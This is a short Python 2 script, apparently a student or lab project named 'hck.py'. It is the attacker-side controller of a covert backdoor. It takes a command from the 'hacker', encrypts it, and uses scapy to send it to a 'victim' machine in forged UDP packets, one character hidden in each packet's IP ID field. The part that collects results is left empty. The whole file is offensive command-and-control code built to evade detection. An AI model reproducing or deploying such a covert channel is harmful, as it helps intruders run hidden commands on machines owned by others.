# ###################################################################
# hck.py 
# 
# main functions:
#	- get input from hacker (cmd)
#	- 
# ###################################################################
from scapy.all import *
from encrypt import *
import argparse
import sys

pw = ""
mypacket = IP()
srcIp = "192.168.0.9"
desIp = "192.168.0.8"

def main():
	global pw
	# ask for the password for encryption
	pw = raw_input("Set a password for encryption: ")

	# get command	
	cmd = raw_input("# ")
	# encrypt the command before sending it to victim's machine
	enc_cmd = encrypt(cmd, pw)

	# send to victim using scapy
	# how to put random data on each field
	
	mypacket = IP()/fuzz(UDP())
	mypacket.src = srcIp
	mypacket.dst = desIp

	print enc_cmd

	for c in enc_cmd:
		mypacket.id = ord(c)	# ascii to int  ( opposite: str(unichr(97))  )

		# send forged packet
		send(mypacket)

	# recv the result
	

if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		print("Terminate signal received. Exiting...")